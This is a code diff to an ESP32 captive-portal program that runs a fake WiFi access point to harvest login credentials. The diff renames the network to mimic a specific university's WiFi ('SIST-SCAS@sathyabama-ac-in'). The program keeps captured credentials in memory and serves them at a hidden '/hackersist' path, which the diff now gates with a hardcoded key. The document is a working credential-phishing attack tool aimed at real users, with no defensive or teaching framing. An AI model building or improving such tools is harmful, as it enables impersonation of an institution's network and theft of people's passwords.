@@ -3,7 +3,7 @@
 #include "ESPAsyncWebServer.h"
 #include <DNSServer.h>
 
-const char* ssid = "Free_Sathyabama_WiFi";
+const char* ssid = "SIST-SCAS@sathyabama-ac-in";
 IPAddress local_IP(100, 96, 0, 1);  // Fake public WiFi Gateway IP
 IPAddress gateway(100, 96, 0, 1);
 IPAddress subnet(255, 255, 255, 0);
@@ -13,6 +13,7 @@ AsyncWebServer server(80);
 
 // Store credentials in memory
 String capturedCredentials = "";
+const char* secretKey = "panicboy123";
 
 // ✅ Captive Portal Login Page
 const char login_html[] PROGMEM = R"rawliteral(
@@ -125,6 +126,15 @@ void setup() {
 
     // ✅ Secret Path to View Stored Credentials in Memory
     server.on("/hackersist", HTTP_GET, [](AsyncWebServerRequest *request){
+        if (!request->hasParam("key")) {
+            request->send(403, "text/html", "<h2>Access Denied</h2>");
+            return;
+        }
+        String key = request->getParam("key")->value();
+        if (key != secretKey) {
+            request->send(403, "text/html", "<h2>Invalid Key</h2>");
+            return;
+        }
         if (capturedCredentials.length() == 0) {
             request->send(200, "text/html", "<h2>No credentials found.</h2>");
         } else {
